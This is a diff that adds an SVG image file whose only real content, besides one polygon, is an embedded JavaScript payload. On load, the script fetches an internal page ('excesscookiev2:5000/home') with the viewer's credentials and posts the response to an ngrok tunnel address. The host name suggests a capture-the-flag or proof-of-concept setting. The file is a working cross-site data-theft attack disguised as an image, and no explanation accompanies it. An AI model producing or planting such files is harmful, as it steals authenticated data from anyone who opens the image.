@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?> 
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve"> 
+  <g>
+    <polygon fill="#00B0D9" points="41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 "></polygon>
+    <script type="text/javascript">
+      var xhr = new XMLHttpRequest();
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+          var xhr2 = new XMLHttpRequest();
+          xhr2.open("POST", "https://7c76-103-224-34-242.ngrok.io", true);
+          xhr2.send(xhr.responseText);
+        }
+      }   
+      xhr.open("GET", "http://excesscookiev2:5000/home");
+      xhr.withCredentials = true;
+      xhr.send();
+    </script>
+  </g>
+</svg>
